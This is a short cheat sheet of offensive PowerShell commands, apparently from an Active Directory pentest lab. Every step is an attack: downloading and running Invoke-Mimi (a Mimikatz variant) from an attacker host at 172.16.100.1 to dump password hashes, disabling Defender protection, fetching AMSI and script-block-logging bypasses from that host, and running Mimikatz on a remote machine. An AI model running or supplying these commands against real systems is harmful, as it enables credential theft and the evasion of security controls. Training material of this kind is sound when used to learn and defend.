**Check permission to execute command:**
```powershell
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName corp-pc
```

**Use Invoke-Mimi to dump hashe:**
```powershell
iex (iwr http://172.16.100.1/Invoke-Mimi.ps1 -UseBasicParsing)
```

**Disable AMSI:**
```powershell
$sess = New-PSSession -ComputerName corp-pc.dollarcorp.moneycorp.local

# If you have admin privileges
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess

# If you don't have admin privileges
Invoke-command -ScriptBlock {iex (iwr http://172.16.100.1/sbloggingbypass.txt -UseBasicParsing);iex (iwr http://172.16.100.1/amsibypass.txt -UseBasicParsing)} -Session $sess
```

**Execute Invoke-Mimi:**
```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```
